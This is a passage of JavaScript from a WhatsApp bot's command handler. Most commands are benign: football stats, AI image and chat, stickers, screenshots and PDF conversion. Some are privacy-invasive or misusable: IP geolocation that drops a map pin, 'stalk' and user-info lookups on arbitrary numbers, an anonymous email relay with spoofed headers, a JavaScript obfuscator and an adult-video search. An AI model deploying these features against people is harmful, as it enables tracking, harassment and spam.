    await formatMatches('L1', 'Ligue 1', { m, reply: (msg) => m.reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('L1', 'Ligue 1', { m, reply: (msg) => reply(msg) });
  } else {
    reply(`Invalid option. Use:\n.ligue1 standings\n.ligue1 matches\n.ligue1 scorers\n.ligue1 upcoming`);
  }
  break;
}

case 'ucl': // UEFA Champions League
case '.champions': {
  if (!text) return reply(`Please specify what you want:\n.ucl standings\n.ucl matches\n.ucl scorers\n.ucl upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('CL', 'Champions League', { m, reply: (msg) => reply(msg) });
  } else {
    m.reply(`Invalid option. Use:\n.ucl standings\n.ucl matches\n.ucl scorers\n.ucl upcoming`);
  }
  break;
}

case 'uel': // UEFA Europa League
case '.europa': {
  if (!text) return reply(`Please specify what you want:\n.uel standings\n.uel matches\n.uel scorers\n.uel upcoming`);
  
  const query = args[0]?.toLowerCase();
  if (query === 'standings' || query === 'table') {
    await formatStandings('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'matches' || query === 'results') {
    await formatMatches('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'scorers' || query === 'topscorers') {
    await formatTopScorers('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
  } else if (query === 'upcoming' || query === 'fixtures') {
    await formatUpcomingMatches('EL', 'Europa League', { m, reply: (msg) => reply(msg) });
  } else {
    reply(`Invalid option. Use:\n.uel standings\n.uel matches\n.uel scorers\n.uel upcoming`);
  }
  break;
}
//======[Ai menu]=====[
case "generate": {
if (!text) return reply(global.mess.notext);

    const api3Url = `https://api.gurusensei.workers.dev/dream?prompt=${encodeURIComponent(text)}`;
    try {
      await conn.sendMessage(m.chat, { image: { url: api3Url } }, { quoted: m });
    } catch (error) {
      console.error('Error generating image:', error);
      reply(global.mess.error);
    }
}
break
case "gpt": {
if (!text) return reply(global.mess.notext);

    try {
      const apiUrl = `${global.mess.siputzx}/api/ai/gpt3?prompt=you%20are%20an%20helpful%20assistant%20providing%20detailed%20and%20friendly%20responses&content=${encodeURIComponent(text)}`;
      const response = await fetch(apiUrl);
      const result = await response.json();

      if (!result.status || !result.data) {
      reply(global.mess.error);
      } else {
        reply(result.data);
      }
    } catch (error) {
      console.error('Error fetching response from GPT API:', error);
      reply(global.mess.error);
    }
}
break
case "gpt2": {
    if (!text) return reply(global.mess.notext);
    
    try {
        let res = await fetch(`https://api.giftedtech.com/?apikey=gifted&q=${encodeURIComponent(text)}`);
        
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        
        let json = await res.json();
        
        if (json && json.success && json.result) {
            reply(json.result);
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error fetching from GPT API:', error);
        reply(global.mess.error);
    }
}
break
//====[helpers CMD]======
case "helpers": {
    const search = (args && args.length) ? args.join(" ").toLowerCase() : "";

// Check if global.helpersList exists and is an array
const helpersList = Array.isArray(global.mess.helpersList) ? global.mess.helpersList : [];

const filtered = helpersList.filter(helper =>
    helper && helper.country && (helper.country.toLowerCase().includes(search))
);

if (!filtered.length) {
    return reply(`x No helper found for "${search}".\nTry using: *.helpers* to see all.`);
}
    filtered.sort((a, b) => (a.country || "").localeCompare(b.country || ""));

    let text = `*🌍 Vinic-Xmd Verified Helpers*\n\n`;
    filtered.forEach((helper, index) => {
      text += `${index + 1}. ${helper.flag || ""} *${helper.country || "N/A"}*\n   • ${helper.name || "N/A"}: ${helper.number || "N/A"}\n\n`;
    });

    text += `✅ Vinic-Xmd Team\n`;
    text += `📢 For more information and updates? Join our support group:\n👉 https://chat.whatsapp.com/IixDQqcKOuE8eKGHmQqUod?mode=ems_copy_c\n`;
    text += `⚠️ Charges may apply depending on the service provided.`;

    reply(text);
}
break
case "flux": {
   try {
if (!text) return reply(`*Usage:* ${command} <prompt>\n\n*Example:* ${command} cat`);
    

    await reply('> *Vinic-Xmd ᴘʀᴏᴄᴇssɪɴɢ ɪᴍᴀɢᴇ...*');

    const apiUrl = `https://apis.davidcyriltech.my.id/flux?prompt=${encodeURIComponent(text)}`;

    await conn.sendMessage(m.chat, { image: { url: apiUrl }, caption: `🎨 *FLUX IMAGE GENERATOR*\n\n📄 *PROMPT:* ${text}\n\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Vinic-Xmd` }, { quoted: m });
  } catch (error) {
    console.error('Error in Flux command:', error);
    reply(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
      }
}
break
//====[Toaudio and tovideo CMDS]==
case "toaudio": {

const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";
    if (!quoted) return reply('*Reply to a video to convert it to audio!*');
    if (!/video/.test(mime)) return reply('*Only videos can be converted to audio!*');

    try {
      let buffer = await quoted.download();
      let converted = await toAudio(buffer, 'mp4');

      await conn.sendMessage(m.chat, { audio: converted.data, mimetype: 'audio/mpeg' }, { quoted: m });
      await converted.delete();
    } catch (e) {
      console.error(e);
      reply('*Failed to convert video to audio!*');
    }
}
break
case "tovideo": {
 if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
    
    try {
      const media = await m.quoted.download();
      const videoUrl = await webp2mp4(media);
      
      if (!videoUrl) throw new Error('Conversion failed');
      
      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
      
    } catch (error) {
      console.error(error);
      reply('❌ Failed to convert sticker to video. Please try again later.');
    }
}

break
case 'trackip': {
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};

if (!res.success) throw new Error(`IP ${text} not found!`);
await dave.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break 

  //========================================================\\       

      case 'lemonmail': case 'sendemail': {
 const args = text.split('|'); if (args.length < 3) return m.reply('Format wrong! Provide: email|subject|message');
const [target, subject, message] = args;
        m.reply('sending email...');
        try {
            const data = JSON.stringify({ "to": target.trim(), "subject": subject.trim(), "message": message.trim() });
            const config = {
                method: 'POST',
                url: 'https://lemon-email.vercel.app/send-email',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36',
                    'Content-Type': 'application/json',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
                    'sec-ch-ua-mobile': '?1',
                    'origin': 'https://lemon-email.vercel.app',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://lemon-email.vercel.app/',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                    'priority': 'u=1, i'
                },
                data: data
            };
            const axios = require('axios');
            const api = await axios.request(config);
            m.reply(`Email: ${JSON.stringify(api.data, null, 2)}`);
        } catch (error) {
            m.reply(`Error: ${error.message}`);
        }
        }
        break
  //========================================================\\  

case 'myip':
            case 'ipbot':
                if (!Owner) return m.reply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        reply("🔎 My public IP address is: " + ip);
                    })
                })
            break

       //========================================================\\     
 break    
  case "tts": {
  if(!text) return m.reply("`provide a query`");
  m.reply(`processing your query`);
  try {
    let anu = `https://api.siputzx.my.id/api/tools/tts?text=${encodeURIComponent(text)}&voice=jv-ID-DimasNeural&rate=0%&pitch=0Hz&volume=0%`;
    const response = await axios.get(anu, {
      responseType: 'arraybuffer'
    });
    let buffer = response.data;

    conn.sendMessage(m.chat, {
      audio: buffer,
      mimetype: "audio/mpeg",
      ptt: true
    })
  } catch (err) {
    console.log(err);
    return err;
  }
}
break;

 //========================================================\\     

break

 //========================================================\\    
  case 'ghiblistyle': case 'toghibli':{
 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime) return conn.sendMessage(m.chat, { text: 'Reply to a photo' }, { quoted: m });
 if (!mime.startsWith('image')) return conn.sendMessage(m.chat, { text: 'provide a photo!' }, { quoted: m });
 const media = await q.download();
 const base64Image = media.toString('base64');
 await conn.sendMessage(m.chat, { text: '⏳ proses bro..' }, { quoted: m });
 const axios = require('axios');
 const response = await axios.post(
 `https://ghiblistyleimagegenerator.cc/api/generate-ghibli`, 
 { image: base64Image }, 
 { headers: {
 'authority': 'ghiblistyleimagegenerator.cc',
 'origin': 'https://ghiblistyleimagegenerator.cc',
 'referer': 'https://ghiblistyleimagegenerator.cc/',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
 } 
 }
 );
 if (!response.data.success) return conn.sendMessage(m.chat, { text: 'provide a photo' }, { quoted: m });
 const ghibliImageUrl = response.data.ghibliImage; 
 const form = new FormData();
 form.append('reqtype', 'fileupload');
 form.append('userhash', '');
 form.append('fileToUpload', Buffer.from(media), 'ghibli.jpg'); 
 const upres = await axios.post('https://catbox.moe/user/api.php', form, {
 headers: form.getHeaders()
 });
 const upUrl = upres.data.trim();
 await dave.sendMessage(m.chat, {
 image: { url: ghibliImageUrl },
 caption: `🎨 *Ghibli Style Image Generated*`,
 mentions: [m.sender]
 }, { quoted: m });
 } catch (error) {
 console.error('Error:', error);
 await conn.sendMessage(m.chat, { text: `Error: ${error.message || 'error'}` }, { quoted: m });
 }
}
 break


  //========================================================\\    
case "xvideos":{
    if (!q) return m.reply(`Example: ${prefix + command} anime`);
    m.reply(mess.wait);
const axios = require('axios');    
    try {
        const apiUrl = `https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(q)}`;
        const { data } = await axios.get(apiUrl);

        if (!data.status) return m.reply("Failed to fetch search results");

        let resultText = `*XNXX SEARCH RESULTS*\n`;
        resultText += `*Query:* ${q}\n`;
        resultText += `*Found:* ${data.result.length} videos\n\n`;

        const maxResults = 10;
        const displayResults = data.result.slice(0, maxResults);

        displayResults.forEach((video, index) => {
            resultText += `*${index + 1}. ${video.title}*\n`;
            resultText += `Info: ${video.info.trim()}\n`;
            resultText += `Link: ${video.link}\n\n`;
        });

        if (data.result.length > maxResults) {
            resultText += `_And ${data.result.length - maxResults} more results..._\n`;
            resultText += `_Use ${prefix}xnxxdown [link] to download any video_`;
        }

        await conn.sendMessage(m.chat, {
            text: resultText
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        m.reply(`Error: ${error.message}`);
    }
    }
 break
//======[OTHER MENU CMDS]===
case "sswebtab": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `https://api.tioo.eu.org/sstab?url=${q}`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break 
case 'translate':{
  	if (!text) return reply(`*Where is the text*\n\n*𝙴xample usage*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`)
  	const defaultLang = 'en'
const tld = 'cn'
    let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim()
    let lang = args[0]
    let text = args.slice(1).join(' ')
    if ((args[0] || '').length !== 2) {
        lang = defaultLang
        text = args.join(' ')
    }
    if (!text && m.quoted && m.quoted.text) text = m.quoted.text
    try {
       let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null) 
       reply(result.text)
    } catch (e) {
        return reply(err)
    } 
    }
break
case "ss2": {
 const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=mobile`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred while generating the image.");
    }
}
break
case "ss": {
try {
    const url = args[0];
    if (!url) return reply("❌ Please provide a URL\nExample: .screenshot https://google.com");
    if (!url.startsWith("http")) return reply("❌ URL must start with http:// or https://");

    // ASCII loading bars with percentage
    const loadingBars = [
        { percent: 10, bar: "[▓░░░░░░░░░]", text: "✦ Initializing capture..." },
        { percent: 20, bar: "[▓▓░░░░░░░░]", text: "✦ Connecting to website..." },
        { percent: 30, bar: "[▓▓▓░░░░░░░]", text: "✦ Loading page content..." },
        { percent: 40, bar: "[▓▓▓▓░░░░░░]", text: "✦ Rendering elements..." },
        { percent: 50, bar: "[▓▓▓▓▓░░░░░]", text: "✦ Processing JavaScript..." },
        { percent: 60, bar: "[▓▓▓▓▓▓░░░░]", text: "✦ Capturing viewport..." },
        { percent: 70, bar: "[▓▓▓▓▓▓▓░░░]", text: "✦ Scrolling page..." },
        { percent: 80, bar: "[▓▓▓▓▓▓▓▓░░]", text: "✦ Finalizing screenshot..." },
        { percent: 90, bar: "[▓▓▓▓▓▓▓▓▓░]", text: "✦ Optimizing image..." },
        { percent: 100, bar: "[▓▓▓▓▓▓▓▓▓▓]", text: "✓ Capture complete!" }
    ];

    // Send initial message
    const loadingMsg = await conn.sendMessage(from, {
        text: "🔄 Starting screenshot capture...\n✦ Please wait..."
    }, { quoted: mek });

    // Animate loading progress
    for (const frame of loadingBars) {
        await sleep(800);
        await conn.relayMessage(from, {
            protocolMessage: {
                key: loadingMsg.key,
                type: 14,
                editedMessage: {
                    conversation: `📸 ${frame.bar} ${frame.percent}%\n${frame.text}`
                }
            }
        }, {});
    }

    // Final update before sending
    await sleep(800);
    await conn.relayMessage(from, {
        protocolMessage: {
            key: loadingMsg.key,
            type: 14,
            editedMessage: {
                conversation: "✅ Screenshot Captured!\n✦ Sending now..."
            }
        }
    }, {});

    await sleep(1000);

    // Send the actual screenshot
    await conn.sendMessage(from, {
        image: { url: `https://image.thum.io/get/fullpage/${url}` },
        caption: "- 🖼️ *Screenshot Generated*\n\n" +
                "> ᴘᴏᴡᴇʀᴇᴅ ʙʏ Vinic-Xmd 💪 💜"
    }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("❌ Failed to capture screenshot\n✦ Please try again later");
  }
}
break
case "sswebpc": {
const q = args.join(" ");
    if (!q) return reply(`Please provide a URL to screenshot!`);
    
    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=tablet`;
    
    try {
      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
    } catch (error) {
      console.error('Error generating screenshot:', error);
      reply("An error occurred.");
    }
}
break
case "obfuscate": {
//  this is directory creation code
const tmpDir = './tmp';
if (!fs.existsSync(tmpDir)) {
    fs.mkdirSync(tmpDir, { recursive: true });
}
const quoted = m.quoted ? m.quoted : null;
  const mime = quoted?.mimetype || "";

  if (!quoted || mime !== "application/javascript") {
  return conn.sendMessage(m.chat, { text: "❌ *Error:* Reply to a `.js` file with `.obfuscate`!" }, { quoted: m });
          }
  try {
  const media = await quoted.download();
  const tempFile = `./tmp/original-${Date.now()}.js`;
  await fs.promises.writeFile(tempFile, media);

  conn.sendMessage(m.chat, { text: "🔒 Obfuscation started..." }, { quoted: m });

  const obfuscatedFile = await obfuscateJS(tempFile);

  await conn.sendMessage(m.chat, { text: "✅ Obfuscation complete! Sending file..." }, { quoted: m }); 
 
  await conn.sendMessage(m.chat, { document: fs.readFileSync(obfuscatedFile), mimetype: "text/javascript", fileName: "obfuscated.js" });

  await fs.promises.unlink(tempFile);
  await fs.promises.unlink(obfuscatedFile);
   } catch (error) {
  conn.sendMessage(from, { text: `❌ *Error:* ${error.message}` }, { quoted: m });
        } 

}
break
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return reply(`Username? `)
let res = await fg.ttStalk(args[0])
let txt = `
┌──「 *TIKTOK STALK* 
──「 *TIKTOK STALK* 
▢ *🔖Number:* ${res.name}
▢ *🔖Username:* ${res.username}
▢ *👥followers:* ${res.followers}
▢ *🫂following:* ${res.following}
▢ *📌Desc:* ${res.desc}

▢ *🔗 Link* : https://tiktok.com/${res.username}
└────────────`
await conn.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
//======[CONVERT MENU CMDS]===
break 
case "sticker": {
const quoted = m.quoted || m.msg?.quoted;
    if (!quoted) {
      return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
    }

    const mime = quoted.mimetype || quoted.msg?.mimetype;
    if (!mime) {
      return reply(`The quoted message does not contain media. Please send or reply to an image, video, or gif.`);
    }

    const swns = args.join(" ");
    const pcknms = swns.split("|")[0];
    const atnms = swns.split("|")[1];

    try {
      if (/image/.test(mime)) {
        const media = await quoted.download();
        await conn.sendImageAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
      else if (/video/.test(mime)) {
        if ((quoted.msg || quoted).seconds > 10) {
          return reply("The video length must be 10 seconds or less. Please try again.");
        }
        const media = await quoted.download();
        await conn.sendVideoAsSticker(m.chat, media, m, {
          packname: pcknms ? pcknms : global.packname,
          author: atnms ? atnms : global.author,
        });
      }
    
      else {
        return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
      }
    } catch (error) {
      console.error('Error processing sticker:', error);
      reply('An error occurred while processing the sticker.');
    }
}
break
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`tag/reply Video/Audio with Caption ${prefix + command}`)
let media = await conn.downloadMediaMessage(qmsg)
let audio = await toAudio(media, 'mp4')
bot.sendMessage(m.chat, {
audio: audio,
mimetype: 'audio/mpeg'
}, {
quoted: m
})
}
break
case "topdf":
case "pdf": {
try {
        if (!q) return reply("Please provide the text you want to convert to PDF. *Eg* `.topdf` *Kevin Ug🇺🇬*");

        // Create a new PDF document
        const doc = new PDFDocument();
        let buffers = [];
        doc.on('data', buffers.push.bind(buffers));
        doc.on('end', async () => {
            const pdfData = Buffer.concat(buffers);

            // Send the PDF file
            await conn.sendMessage(from, {
                document: pdfData,
                mimetype: 'application/pdf',
                fileName: 'Vinic-X .pdf',
                caption: `
*📄 PDF created successully!*

> © Created by Vinic-Xmd`
            }, { quoted: mek });
        });

        // Add text to the PDF
        doc.text(q);

        // Finalize the PDF and end the stream
        doc.end();

    } catch (e) {
        console.error(e);
        reply(`Error: ${e.message}`);
    }
} 
break
case "fliptext": {
    if (args.length < 1) return reply(`*Example:\n${prefix}fliptext Kelvin*`);
    
    let quere = args.join(" ");
    let flipe = quere.split("").reverse().join("");
    
    reply(`Normal:\n${quere}\nFlip:\n${flipe}`);
}
break
case "getdevice": {
   if (!m.quoted) {
      return reply('*Please quote a message to use this command!*');
    }
    
    console.log('Quoted Message:', m.quoted);
console.log('Quoted Key:', m.quoted?.key);

    try {
      const quotedMsg = await m.getQuotedMessage();

      if (!quotedMsg) {
        return reply('*Could not detect, please try with newly sent message!*');
      }

      const messageId = quotedMsg.key.id;

      const device = getDevice(messageId) || 'Unknown';

      reply(`The message is sent from *${device}* device.`);
    } catch (err) {
      console.error('Error determining device:', err);
      reply('Error determining device: ' + err.message);
    }
}
break
case "styletext": {
if (!text) return reply('*Enter a text!*');
    
    try {
      let anu = await styletext(text);
      let teks = `Styles for ${text}\n\n`;
      
      for (let i of anu) {
        teks += `□ *${i.name}* : ${i.result}\n\n`;
      }
      
      reply(teks);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while fetching fancy text styles.*');
    }
}
break
case "tourl":   case "url": {
const quoted = m.quoted || m.msg?.quoted;
    const mime = quoted?.mimetype || quoted?.msg?.mimetype;

    if (!quoted || !mime) {
      return reply('*Please reply to a media message!*');
    }

    try {
      const mediaUrl = await handleMediaUpload(quoted, conn, mime);
      reply(`*Uploaded successfully:*\n${mediaUrl}`);
    } catch (error) {
      console.error(error);
      reply('*An error occurred while uploading the media.*');
    }
}
break
case "userinfo":
case "ui": {
    try {
        let targetUser;
        
        // Determine the target user
        if (m.mentionedJid && m.mentionedJid.length > 0) {
            targetUser = m.mentionedJid[0];
        } else if (m.quoted && m.quoted.sender) {
            targetUser = m.quoted.sender;
        } else if (text) {
            // Extract numbers from text
            const numbers = text.match(/\d+/g);
            if (numbers && numbers.length > 0) {
                targetUser = numbers[0] + '@s.whatsapp.net';
            } else {
                targetUser = m.sender; // Use sender if no valid number found
            }
        } else {
            targetUser = m.sender; // Default to sender
        }

        // Validate the target user format
        if (!targetUser.includes('@s.whatsapp.net')) {
            targetUser = targetUser.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        }

        // Get user info with proper error handling
        const userJid = targetUser;
        
        // Get basic user info
        const [usernameResult, userDataResult] = await Promise.allSettled([
            conn.getName(userJid).catch(() => 'Unknown'),
            conn.onWhatsApp(userJid).catch(() => [])
        ]);

        const username = usernameResult.status === 'fulfilled' ? usernameResult.value : 'Unknown';
        const userData = userDataResult.status === 'fulfilled' && userDataResult.value.length > 0 ? 
                        userDataResult.value[0] : null;

        // Check if user exists on WhatsApp
        if (!userData || userData.exists !== true) {
            return reply('❌ *This user is not registered on WhatsApp or the number is invalid.*');
        }

        // Get additional info with error handling
        const [profilePicture, aboutInfo, isBusiness, isBlocked] = await Promise.allSettled([
            conn.profilePictureUrl(userJid, 'image').catch(() => null),
            conn.fetchStatus(userJid).catch(() => null),
            conn.getBusinessProfile(userJid).catch(() => null),
            conn.fetchBlocklist().then(blocklist => 
                blocklist && Array.isArray(blocklist) ? blocklist.includes(userJid) : false
            ).catch(() => false)
        ]).then(results => [
            results[0].status === 'fulfilled' ? results[0].value : null,
            results[1].status === 'fulfilled' ? results[1].value : null,
            results[2].status === 'fulfilled' ? results[2].value : null,
            results[3].status === 'fulfilled' ? results[3].value : false
        ]);

        // Get group-specific info if in a group
        let groupRole = "Not in this group";
        let isAdmin = false;
        
        if (m.isGroup && participants && Array.isArray(participants)) {
            const participant = participants.find(p => p.id === userJid);
            if (participant) {
                groupRole = participant.admin ? 
                    (participant.admin === 'superadmin' ? 'Group Owner' : 'Admin') : 'Member';
                isAdmin = !!participant.admin;
            }
        }

        // Check if user is premium/owner/contributor with safe access
        const premList = JSON.parse(fs.readFileSync('./start/lib/database/premium.json', 'utf-8') || '[]');
        const isPremium = Array.isArray(premList) ? premList.includes(userJid) : false;

        const kontributorList = JSON.parse(fs.readFileSync('./start/lib/database/owner.json', 'utf-8') || '[]');
        const isContributor = Array.isArray(kontributorList) ? kontributorList.includes(userJid.replace('@s.whatsapp.net', '')) : false;

        // Safely check if user is owner
        const isOwner = Array.isArray(global.owner) ? 
            global.owner.includes(userJid.replace('@s.whatsapp.net', '')) : 
            (global.ownernumber === userJid.replace('@s.whatsapp.net', ''));

        // Format user info
        const userInfo = `
👤 *USER INFORMATION*

📛 *Name:* ${username}
📞 *Number:* ${userJid.replace('@s.whatsapp.net', '')}
🆔 *JID:* ${userJid}

✅ *WhatsApp Status:* Registered
🏢 *Business Account:* ${isBusiness ? 'Yes' : 'No'}
⭐ *Premium User:* ${isPremium ? 'Yes' : 'No'}
👑 *Bot Owner:* ${isOwner ? 'Yes' : 'No'}
🤝 *Contributor:* ${isContributor ? 'Yes' : 'No'}
🚫 *Blocked:* ${isBlocked ? 'Yes' : 'No'}

📝 *About:* ${aboutInfo?.status || 'Not set'}
🕒 *Last Updated:* ${aboutInfo?.setAt ? new Date(aboutInfo.setAt).toLocaleString() : 'Unknown'}

${m.isGroup ? `👥 *Group Role:* ${groupRole}\n📊 *Is Admin:* ${isAdmin ? 'Yes' : 'No'}\n` : ''}

🔗 *Profile Picture:* ${profilePicture ? 'Available' : 'Not available'}
        `.trim();

        // Send user info
        if (profilePicture) {
            await conn.sendMessage(
                m.chat,
                {
                    image: { url: profilePicture },
                    caption: userInfo,
                    mentions: [userJid]
                },
                { quoted: m }
            );
        } else {
            await conn.sendMessage(
                m.chat, 
                { 
                    text: userInfo,
                    mentions: [userJid],
                    contextInfo: {
                        externalAdReply: {
                            title: `User Info - ${username}`,
                            body: `Requested by ${pushname || 'Unknown'}`,
                            thumbnail: await getBuffer('https://files.catbox.moe/uy3kq9.jpg').catch(() => null),
                            mediaType: 1,
                            sourceUrl: 'https://whatsapp.com'
                        }
                    }
                },
                { quoted: m }
            );
        }

    } catch (error) {
        console.error('Error in userinfo command:', error);
        reply('❌ *An error occurred while fetching user information. Please try again.*');
    }
    
}
break
case "npm": {
try {
    // Check if a package name is provided
    if (!args.length) {
      return reply("Please provide the name of the npm package you want to search for. Example: .npm express");
    }

    const packageName = args.join(" ");
    const apiUrl = `https://registry.npmjs.org/${encodeURIComponent(packageName)}`;

    // Fetch package details from npm registry
    const response = await axios.get(apiUrl);
    if (response.status !== 200) {
      throw new Error("Package not found or an error occurred.");
    }

    const packageData = response.data;
    const latestVersion = packageData["dist-tags"].latest;
    const description = packageData.description || "No description available.";
    const npmUrl = `https://www.npmjs.com/package/${packageName}`;
    const license = packageData.license || "Unknown";
    const repository = packageData.repository ? packageData.repository.url : "Not available";

    // Create the response message
    const message = `
*Vinic-Xmd npm search*

*👀 NPM PACKAGE:* ${packageName}
*📄 DESCRIPTION:* ${description}
*⏸️ LAST VERSION:* ${latestVersion}
*🪪 LICENSE:* ${license}
*🪩 REPOSITORY:* ${repository}
*🔗 NPM URL:* ${npmUrl}
`;

    // Send the message
    await conn.sendMessage(from, { text: message }, { quoted: mek });

  } catch (error) {
    console.error("Error:", error);
    reply("An error occurred: " + error.message);
  }
}
break
case "kevinfarm": {
const familyList = `
         *[ • VINIC-XMD 𝖥𝖠𝖬𝖨𝖫𝖸 • ]*

    [ • KEVIN: KING👸 ]
       *•────────────•⟢*
                *𝖥𝖱𝖨𝖤𝖭𝖣’𝖲*
      *╭┈───────────────•*
      *│  ◦* *▢➠ Malvin king*
      *│  ◦* *▢➠ The great lonelysaam*
      *│  ◦* *▢➠ Dev sung*
      *│  ◦* *▢➠ Terri*
      *│  ◦* *▢➠ Trendx*
      *│  ◦* *▢➠ Dave MD*
      *│  ◦* *▢➠ goodnesstech*
      *╰┈───────────────•*
        *•────────────•⟢*
    `;
    try {
        // Envoi de la réponse avec l'image et la liste de la famille
        await conn.sendMessage(m.chat, {
            image: { url: "https://files.catbox.moe/ptpl5c.jpeg" },
            caption: familyList.trim()
        }, { quoted: mek });
    } catch (error) {
        console.error(error);
        reply("❌ *An error occurred while fetching the family list. Please try again.*");
    }
}
break
case "userinfo":
case "ui": {
    try {
        // 1. DETERMINE TARGET USER
        let userJid = quoted?.sender || 
                     mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                     sender;

        // 2. VERIFY USER EXISTS
        const [user] = await conn.onWhatsApp(userJid).catch(() => []);
        if (!user?.exists) return reply("❌ User not found on WhatsApp");

        // 3. GET PROFILE PICTURE
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(userJid, 'image');
        } catch {
            ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png';
        }

        // 4. GET NAME (MULTI-SOURCE FALLBACK)
        let userName = userJid.split('@')[0];
        try {
            // Try group participant info first
            if (isGroup) {
